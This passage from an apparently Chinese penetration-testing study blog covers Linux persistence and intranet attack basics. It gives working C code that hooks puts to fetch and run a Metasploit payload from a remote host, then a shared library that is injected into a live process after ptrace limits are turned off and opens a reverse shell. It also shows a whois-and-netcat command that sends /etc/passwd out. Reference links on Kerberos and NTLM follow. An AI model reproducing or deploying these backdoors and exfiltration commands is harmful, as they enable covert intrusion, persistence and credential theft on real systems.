<span class="token comment">// 这里是puts调用之前</span>
  result <span class="token operator">=</span> <span class="token function">new_puts</span><span class="token punctuation">(</span>message<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token comment">// 这里是puts调用之后</span>
  <span class="token keyword">return</span> result<span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre>
<p><strong>编译命令：</strong></p>
<pre><code class="prism language-c">gcc hook<span class="token punctuation">.</span>c <span class="token operator">-</span>o hook<span class="token punctuation">.</span>so <span class="token operator">-</span>fPIC <span class="token operator">-</span>shared <span class="token operator">-</span>ldl <span class="token operator">-</span>D_GNU_SOURCE
</code></pre>
<pre><code class="prism language-c"><span class="token operator">-</span>fPIC 选项作用于编译阶段，告诉编译器产生与位置无关代码（Position<span class="token operator">-</span>Independent Code）；这样一来，产生的代码中就没有绝对地址了，全部使用相对地址，所以代码可以被加载器加载到内存的任意位置，都可以正确的执行。这正是共享库所要求的，共享库被加载时，在内存的位置不是固定的。
<span class="token operator">-</span>shared 生成共享库格式
<span class="token operator">-</span>ldl 显示方式加载动态库，可能会调用dlopen、dlsym、dlclose、dlerror
<span class="token operator">-</span>D_GNU_SOURCE 以GNU规范标准编译
</code></pre>
<p>编写好劫持puts函数的代码后，需要先生成一个Metasploit木马，使得在系统调用puts函数之前，都执行一次木马。</p>
<p><img src="https://img-blog.csdnimg.cn/20201006202912772.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>
<code>exploit/multi/script/web_delivery</code> 模块能够直接生成一条Python命令，这能够非常方便的获得Meterpreter。 接下来，将劫持puts函数的代码做一些小改动，在执行puts之前，调用系统函数system来运行python命令，这样每次调用puts都可以获得Meterpreter会话。<br>
<img src="https://img-blog.csdnimg.cn/20201006202930203.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>
正常执行的过程：<br>
<img src="https://img-blog.csdnimg.cn/20201006202945433.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>
执行whoami后，由于底层会调用puts函数，因此也会执行python命令，Metasploit不出意外的获得了Meterpreter：<br>
<img src="https://img-blog.csdnimg.cn/2020100620295581.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>
接着，为了防止在短时间内获得多个重复的会话，因此需要优化一下代码，例如以某个文件行数和调用puts函数的次数进行取余，就能够达到执行多少次puts函数获得一次Meterpreter。 优化代码如下：</p>
<pre><code class="prism language-c"><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;unistd.h&gt;</span></span>
<span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;dlfcn.h&gt;</span></span>
<span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;stdlib.h&gt;</span></span>
<span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;sys/stat.h&gt;</span></span>
<span class="token macro property">#<span class="token directive keyword">define</span> BUFFER_SIZE 100</span>
<span class="token macro property">#<span class="token directive keyword">define</span> COMMAND_NUM 5</span>
<span class="token keyword">int</span> <span class="token function">check_file_line</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span> filename<span class="token punctuation">)</span><span class="token punctuation">{</span>
	<span class="token keyword">int</span> file_line <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
	<span class="token keyword">char</span> buffer<span class="token punctuation">[</span>BUFFER_SIZE<span class="token punctuation">]</span><span class="token punctuation">;</span>
	FILE <span class="token operator">*</span>fp <span class="token operator">=</span> <span class="token constant">NULL</span><span class="token punctuation">;</span>
	fp <span class="token operator">=</span> <span class="token function">fopen</span><span class="token punctuation">(</span>filename<span class="token punctuation">,</span><span class="token string">"r"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token keyword">if</span><span class="token punctuation">(</span>fp<span class="token operator">==</span><span class="token constant">NULL</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
		<span class="token keyword">return</span> file_line<span class="token punctuation">;</span>
	<span class="token punctuation">}</span>

	<span class="token keyword">while</span><span class="token punctuation">(</span><span class="token function">fgets</span><span class="token punctuation">(</span>buffer<span class="token punctuation">,</span>BUFFER_SIZE<span class="token punctuation">,</span>fp<span class="token punctuation">)</span><span class="token operator">!=</span> <span class="token constant">NULL</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
		file_line <span class="token operator">++</span><span class="token punctuation">;</span>
	<span class="token punctuation">}</span>
	<span class="token function">fclose</span><span class="token punctuation">(</span>fp<span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token keyword">return</span> file_line<span class="token punctuation">;</span>
<span class="token punctuation">}</span>

<span class="token keyword">void</span> <span class="token function">add_file_line</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span> filename<span class="token punctuation">)</span><span class="token punctuation">{</span>
	FILE <span class="token operator">*</span> fp <span class="token operator">=</span> <span class="token constant">NULL</span><span class="token punctuation">;</span>
	fp <span class="token operator">=</span> <span class="token function">fopen</span><span class="token punctuation">(</span>filename<span class="token punctuation">,</span><span class="token string">"a+"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token keyword">if</span><span class="token punctuation">(</span>fp <span class="token operator">==</span> <span class="token constant">NULL</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
		<span class="token keyword">return</span><span class="token punctuation">;</span>
	<span class="token punctuation">}</span>
	
	<span class="token function">fputs</span><span class="token punctuation">(</span><span class="token string">"1\n"</span><span class="token punctuation">,</span>fp<span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token function">fclose</span><span class="token punctuation">(</span>fp<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>

<span class="token keyword">void</span> <span class="token function">call_system</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>

  <span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"python -c \"import sys;u=__import__('urllib'+{2:'',3:'.request'}[sys.version_info[0]],fromlist=('urlopen',));r=u.urlopen('http://192.168.170.138:8080/o1ZJy3Wue');exec(r.read());\""</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token punctuation">}</span>

<span class="token keyword">int</span> <span class="token function">puts</span><span class="token punctuation">(</span><span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span>message<span class="token punctuation">)</span> <span class="token punctuation">{</span>
  <span class="token keyword">char</span> <span class="token operator">*</span> filename <span class="token operator">=</span> <span class="token string">"/tmp/err.log"</span><span class="token punctuation">;</span>
  <span class="token keyword">int</span> <span class="token punctuation">(</span><span class="token operator">*</span>new_puts<span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span>message<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">int</span> result<span class="token punctuation">;</span>
  <span class="token keyword">int</span> file_lines <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
  new_puts <span class="token operator">=</span> <span class="token function">dlsym</span><span class="token punctuation">(</span>RTLD_NEXT<span class="token punctuation">,</span> <span class="token string">"puts"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">add_file_line</span><span class="token punctuation">(</span>filename<span class="token punctuation">)</span><span class="token punctuation">;</span>
  file_lines <span class="token operator">=</span> <span class="token function">check_file_line</span><span class="token punctuation">(</span>filename<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"[+]file_line : %d, NUM = %d \n"</span><span class="token punctuation">,</span>file_lines<span class="token punctuation">,</span> COMMAND_NUM<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">if</span><span class="token punctuation">(</span>file_lines <span class="token operator">%</span> COMMAND_NUM <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
  	<span class="token function">call_system</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span>
  result <span class="token operator">=</span> <span class="token function">new_puts</span><span class="token punctuation">(</span>message<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">return</span> result<span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre>
<p><img src="https://img-blog.csdnimg.cn/20201006203020527.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>
在执行至第零次、五次时，成功返回了会话：<br>
<img src="https://img-blog.csdnimg.cn/20201006203041441.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>
COMMAND_NUM 可自定义</p>
<p>参考文章：</p>
<pre><code class="prism language-c">https<span class="token punctuation">:</span><span class="token operator">/</span><span class="token operator">/</span>payloads<span class="token punctuation">.</span>online<span class="token operator">/</span>archivers<span class="token operator">/</span><span class="token number">2020</span><span class="token operator">-</span><span class="token number">01</span><span class="token operator">-</span><span class="token number">01</span><span class="token operator">/</span><span class="token number">1</span>
</code></pre>
<hr>
<h2><a id="729_Linux_5894"></a>7.2.9 Linux权限维持之进程注入</h2>
<p><strong>说明：</strong></p>
<p>通过进程注入技术，能够使得动态链接库被加载到一个正在运行的进程，因此较为隐蔽。进程注入通过调用<code>ptrace()</code>实现了与Windows平台下相同作用的API 函数<strong>CreateRemoteThread()</strong>。在许多Linux发行版中，内核的默认配置文件**/proc/sys/kernel/yama/ptrace_scope<strong>限制了一个进程除了</strong>fork()**派生外，无法通过<code>ptrace()</code>来操作另外一个进程。</p>
<p>要注入进程前，需要关闭这个限制（Root权限）：</p>
<pre><code class="prism language-c">echo <span class="token number">0</span> <span class="token operator">|</span> sudo tee <span class="token operator">/</span>proc<span class="token operator">/</span>sys<span class="token operator">/</span>kernel<span class="token operator">/</span>yama<span class="token operator">/</span>ptrace_scope
</code></pre>
<p><img src="https://img-blog.csdnimg.cn/20201006203336303.png#pic_center" alt="在这里插入图片描述"><br>
在Github上已经有了关于进程注入的实现代码：</p>
<pre><code class="prism language-c">https<span class="token punctuation">:</span><span class="token operator">/</span><span class="token operator">/</span>github<span class="token punctuation">.</span>com<span class="token operator">/</span>gaffe23<span class="token operator">/</span>linux<span class="token operator">-</span>inject
</code></pre>
<p>下载后进入项目目录，执行：make x86_64 即可编译64位的linux-inject。</p>
<p><img src="https://img-blog.csdnimg.cn/2020100620335785.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>
确认编译是否正常：<br>
<img src="https://img-blog.csdnimg.cn/20201006203409686.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>
获取sample-target的PID后，调用inject程序来注入sample-library.so，注入成功会输出“I just got loaded”。 接下来，需要更改sample-target.c文件，编译成需要的权限维持动态链接库。</p>
<pre><code class="prism language-c"><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h&gt;</span></span>
<span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;unistd.h&gt;</span></span>
<span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;dlfcn.h&gt;</span></span>
<span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;stdlib.h&gt;</span></span>


<span class="token keyword">void</span> <span class="token function">shell</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token punctuation">{</span>
	<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"I just got loaded\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"bash -c \"bash -i &gt;&amp; /dev/tcp/192.168.170.138/139 0&gt;&amp;1\""</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
   
<span class="token punctuation">}</span>


<span class="token function">__attribute__</span><span class="token punctuation">(</span><span class="token punctuation">(</span>constructor<span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token keyword">void</span> <span class="token function">loadMsg</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token punctuation">{</span>
   <span class="token function">shell</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre>
<p>通过如下命令编译so文件：</p>
<pre><code class="prism language-c">clang <span class="token operator">-</span>std<span class="token operator">=</span>gnu99 <span class="token operator">-</span>ggdb <span class="token operator">-</span>D_GNU_SOURCE <span class="token operator">-</span>shared <span class="token operator">-</span>o u9<span class="token punctuation">.</span>so <span class="token operator">-</span>lpthread <span class="token operator">-</span>fPIC U3<span class="token punctuation">.</span>c
</code></pre>
<p><img src="https://img-blog.csdnimg.cn/20201006203447547.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>
<img src="https://img-blog.csdnimg.cn/20201006203455152.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>
在Kali Linux这边获得了bash shell：</p>
<p><img src="https://img-blog.csdnimg.cn/20201006203506429.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>
此时发现测试程序的主线程被bash阻塞了，于是可以采用多线程技术，将后门代码与正常逻辑分离执行。<br>
<img src="https://img-blog.csdnimg.cn/20201006203522494.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>
但利用这种方式在执行的过程中，查看进程参数还是会被查看到IP地址和端口：<br>
<img src="https://img-blog.csdnimg.cn/20201006203535890.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>
查看到IP与端口：<br>
<img src="https://img-blog.csdnimg.cn/20201006203548233.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>
再继续改进代码，采用socket套接字的方式来反弹shell：</p>
<pre><code class="prism language-c"><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h&gt;</span></span>
<span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;dlfcn.h&gt;</span></span>
<span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;stdlib.h&gt;</span></span>
<span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;pthread.h&gt;</span></span>
<span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h&gt;</span></span>
<span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;sys/types.h&gt;</span></span>
<span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;sys/socket.h&gt;</span></span>
<span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;unistd.h&gt;</span></span>
<span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;fcntl.h&gt;</span></span>
<span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h&gt;</span></span>
<span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;sys/types.h&gt;</span></span>
<span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;sys/socket.h&gt;</span></span>
<span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;netinet/in.h&gt;</span></span>
<span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;netdb.h&gt;</span></span>


<span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token operator">*</span> <span class="token function">hello</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token punctuation">{</span>

    <span class="token keyword">struct</span> sockaddr_in server<span class="token punctuation">;</span>
    <span class="token keyword">int</span> sock<span class="token punctuation">;</span>
    <span class="token keyword">char</span> shell<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token string">"/bin/bash"</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token punctuation">(</span>sock <span class="token operator">=</span> <span class="token function">socket</span><span class="token punctuation">(</span>AF_INET<span class="token punctuation">,</span> SOCK_STREAM<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">return</span> <span class="token constant">NULL</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    server<span class="token punctuation">.</span>sin_family <span class="token operator">=</span> AF_INET<span class="token punctuation">;</span>
    server<span class="token punctuation">.</span>sin_port <span class="token operator">=</span> <span class="token function">htons</span><span class="token punctuation">(</span><span class="token number">139</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    server<span class="token punctuation">.</span>sin_addr<span class="token punctuation">.</span>s_addr <span class="token operator">=</span> <span class="token function">inet_addr</span><span class="token punctuation">(</span><span class="token string">"192.168.170.138"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">connect</span><span class="token punctuation">(</span>sock<span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">struct</span> sockaddr <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>server<span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span><span class="token keyword">struct</span> sockaddr<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">return</span> <span class="token constant">NULL</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    <span class="token function">dup2</span><span class="token punctuation">(</span>sock<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">dup2</span><span class="token punctuation">(</span>sock<span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">dup2</span><span class="token punctuation">(</span>sock<span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">execl</span><span class="token punctuation">(</span>shell<span class="token punctuation">,</span><span class="token string">"/bin/bash"</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">close</span><span class="token punctuation">(</span>sock<span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"I just got loaded\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">return</span> <span class="token constant">NULL</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>

<span class="token function">__attribute__</span><span class="token punctuation">(</span><span class="token punctuation">(</span>constructor<span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token keyword">void</span> <span class="token function">loadMsg</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token punctuation">{</span>
    pthread_t thread_id<span class="token punctuation">;</span>
    <span class="token function">pthread_create</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>thread_id<span class="token punctuation">,</span><span class="token constant">NULL</span><span class="token punctuation">,</span>hello<span class="token punctuation">,</span><span class="token constant">NULL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre>
<p>执行效果：<br>
<img src="https://img-blog.csdnimg.cn/20201006203618448.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>
Kali Linux获得bash shell：<br>
<img src="https://img-blog.csdnimg.cn/20201006203632239.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>
在实战应用中，需要关闭ptrace的限制，然后注入.so到某个服务进程中，这样达到权限维持的目的。<br>
参考文章：<code>https://payloads.online/archivers/2020-01-01/2</code></p>
<hr>
<h2><a id="7210_WindowsOffice_6015"></a>7.2.10 Windows权限维持之Office启动</h2>
<p>这里也不公布，涉及内部信息，后期我会复现写出来…</p>
<hr>
<h1><a id="_6020"></a>八、内网渗透基础</h1>
<h2><a id="81_Kerberos_6021"></a>8.1 Kerberos协议</h2>
<h2><a id="811_WindowsKerberos_6022"></a>8.1.1 Windows认证原理之Kerberos篇</h2>
<pre><code class="prism language-c">https<span class="token punctuation">:</span><span class="token operator">/</span><span class="token operator">/</span>xz<span class="token punctuation">.</span>aliyun<span class="token punctuation">.</span>com<span class="token operator">/</span>t<span class="token operator">/</span><span class="token number">5004</span>  <span class="token operator">--</span><span class="token operator">-</span>Kerberos Security

https<span class="token punctuation">:</span><span class="token operator">/</span><span class="token operator">/</span>www<span class="token punctuation">.</span>cnblogs<span class="token punctuation">.</span>com<span class="token operator">/</span>artech<span class="token operator">/</span>archive<span class="token operator">/</span><span class="token number">2011</span><span class="token operator">/</span><span class="token number">01</span><span class="token operator">/</span><span class="token number">24</span><span class="token operator">/</span>kerberos<span class="token punctuation">.</span>html   <span class="token operator">--</span><span class="token operator">-</span>Windows安全认证是如何进行的？<span class="token punctuation">[</span>Kerberos篇<span class="token punctuation">]</span>

https<span class="token punctuation">:</span><span class="token operator">/</span><span class="token operator">/</span>cloud<span class="token punctuation">.</span>tencent<span class="token punctuation">.</span>com<span class="token operator">/</span>developer<span class="token operator">/</span>article<span class="token operator">/</span><span class="token number">1596509</span>   <span class="token operator">--</span>Windows认证 <span class="token operator">|</span> 域认证

https<span class="token punctuation">:</span><span class="token operator">/</span><span class="token operator">/</span>www<span class="token punctuation">.</span>anquanke<span class="token punctuation">.</span>com<span class="token operator">/</span>post<span class="token operator">/</span>id<span class="token operator">/</span><span class="token number">190261</span>   <span class="token operator">--</span>Windows内网协议学习Kerberos篇之ASREQ<span class="token operator">&amp;</span> ASREP （深入理解）
</code></pre>
<p>这四篇文章，仔细看完，你会基本理解Kerberos原理…</p>
<hr>
<h2><a id="82_NTLM_6038"></a>8.2 NTLM</h2>
<h2><a id="821_NTLMHash_6039"></a>8.2.1 NTLM协议及Hash抓取</h2>
<p>Windows安全认证有两种方式：Kerberos和NTLM</p>
<pre><code class="prism language-c">https<span class="token punctuation">:</span><span class="token operator">/</span><span class="token operator">/</span>xz<span class="token punctuation">.</span>aliyun<span class="token punctuation">.</span>com<span class="token operator">/</span>t<span class="token operator">/</span><span class="token number">6600</span>

https<span class="token punctuation">:</span><span class="token operator">/</span><span class="token operator">/</span>cloud<span class="token punctuation">.</span>tencent<span class="token punctuation">.</span>com<span class="token operator">/</span>developer<span class="token operator">/</span>article<span class="token operator">/</span><span class="token number">1480923</span>
</code></pre>
<p>这两篇诠释了NTLM协议及Hash抓取…</p>
<hr>
<h2><a id="822_WindowsNTLMdayuTwenty_one_days_6050"></a>8.2.2 Windows认证原理之NTLM篇（dayu-Twenty one days）</h2>
<pre><code class="prism language-c">https<span class="token punctuation">:</span><span class="token operator">/</span><span class="token operator">/</span>my<span class="token punctuation">.</span>oschina<span class="token punctuation">.</span>net<span class="token operator">/</span>u<span class="token operator">/</span><span class="token number">4587410</span><span class="token operator">/</span>blog<span class="token operator">/</span><span class="token number">4435334</span>   <span class="token operator">--</span><span class="token operator">-</span>Windows认证原理入门篇

https<span class="token punctuation">:</span><span class="token operator">/</span><span class="token operator">/</span>www<span class="token punctuation">.</span>anquanke<span class="token punctuation">.</span>com<span class="token operator">/</span>post<span class="token operator">/</span>id<span class="token operator">/</span><span class="token number">193149</span>   <span class="token operator">--</span><span class="token operator">-</span>Windows内网协议学习NTLM篇之NTLM基础介绍

https<span class="token punctuation">:</span><span class="token operator">/</span><span class="token operator">/</span>www<span class="token punctuation">.</span>cnblogs<span class="token punctuation">.</span>com<span class="token operator">/</span><span class="token operator">-</span>qing<span class="token operator">-</span><span class="token operator">/</span>p<span class="token operator">/</span><span class="token number">11343859.</span>html   <span class="token operator">--</span><span class="token operator">-</span>域渗透基础之NTLM认证协议
</code></pre>
<p>书上只是基础的讲解了，这里三篇文章详细深入的讲解了NTLM</p>
<hr>
<h2><a id="83_%09_6062"></a>8.3 	内网命令行渗透笔记</h2>
<pre><code class="prism language-c">https<span class="token punctuation">:</span><span class="token operator">/</span><span class="token operator">/</span>www<span class="token punctuation">.</span>cnblogs<span class="token punctuation">.</span>com<span class="token operator">/</span>bmjoker<span class="token operator">/</span>p<span class="token operator">/</span><span class="token number">10336247.</span>html  

https<span class="token punctuation">:</span><span class="token operator">/</span><span class="token operator">/</span>cloud<span class="token punctuation">.</span>tencent<span class="token punctuation">.</span>com<span class="token operator">/</span>developer<span class="token operator">/</span>article<span class="token operator">/</span><span class="token number">1665868</span>

https<span class="token punctuation">:</span><span class="token operator">/</span><span class="token operator">/</span>www<span class="token punctuation">.</span>mi1k7ea<span class="token punctuation">.</span>com<span class="token operator">/</span><span class="token number">2020</span><span class="token operator">/</span><span class="token number">02</span><span class="token operator">/</span><span class="token number">27</span><span class="token operator">/</span>内网信息收集之本机信息收集<span class="token operator">/</span>

https<span class="token punctuation">:</span><span class="token operator">/</span><span class="token operator">/</span>uuzdaisuki<span class="token punctuation">.</span>com<span class="token operator">/</span><span class="token number">2018</span><span class="token operator">/</span><span class="token number">05</span><span class="token operator">/</span><span class="token number">05</span><span class="token operator">/</span>内网渗透常用命令总结（windows）<span class="token operator">/</span>

https<span class="token punctuation">:</span><span class="token operator">/</span><span class="token operator">/</span>my<span class="token punctuation">.</span>oschina<span class="token punctuation">.</span>net<span class="token operator">/</span>u<span class="token operator">/</span><span class="token number">4399281</span><span class="token operator">/</span>blog<span class="token operator">/</span><span class="token number">3581418</span>
</code></pre>
<p>这里集合很多，学会就基本差不多了，我的笔记我不透漏了，大部分是htb上集合的和文章里的…</p>
<hr>
<h2><a id="84__6078"></a>8.4 内网渗透中的文件传输</h2>
<p><strong>利用whois传输文件：</strong></p>
<p>传输机：</p>
<pre><code class="prism language-c">root@john<span class="token punctuation">:</span><span class="token operator">~</span># whois <span class="token operator">-</span>h <span class="token number">127.0</span><span class="token number">.0</span><span class="token number">.1</span> <span class="token operator">-</span>p <span class="token number">4444</span> `cat <span class="token operator">/</span>etc<span class="token operator">/</span>passwd <span class="token operator">|</span> base64`
</code></pre>
<p>接受机：</p>
<pre><code class="prism language-c">root@john<span class="token punctuation">:</span><span class="token operator">/</span>tmp# nc <span class="token operator">-</span>l <span class="token operator">-</span>v <span class="token operator">-</span>p <span class="token number">4444</span> <span class="token operator">|</span> sed <span class="token string">"s/ //g"</span> <span class="token operator">|</span> base64 <span class="token operator">-</span>d
</code></pre>
<p><img src="https://img-blog.csdnimg.cn/20201007213532595.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>
